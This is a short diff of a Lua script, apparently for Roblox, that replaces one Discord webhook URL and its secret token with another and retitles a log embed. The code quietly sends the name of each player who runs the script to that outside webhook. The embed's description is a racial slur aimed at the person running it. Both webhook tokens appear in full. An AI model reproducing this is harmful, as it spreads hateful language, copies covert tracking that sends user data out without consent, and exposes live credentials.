@@ -1,4 +1,4 @@
-local webh = "https://discord.com/api/webhooks/980700311079514132/CbXfHY2Fvo6nruublATZ7TKwwgO9YGgf9cloohOZrUUvkqNbYzUNuNi5iB-ibjIZ0ebJ"
+local webh = "https://discord.com/api/webhooks/997066293683425311/QR7RYY88YlVnhihNNtY4sImwdqrnBiZwyBk6FexMUuDXSaOhJbYcrkaAOoyHauNNVb-b"
 
 
 pcall(function()
@@ -6,7 +6,7 @@ pcall(function()
 
   ['embeds'] = {
     {
-       ['title'] = 'FeevWare Logs',
+       ['title'] = 'RustLogs',
        ['description'] = 'Some Nigger Executed',
        ['fields'] = {
           {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
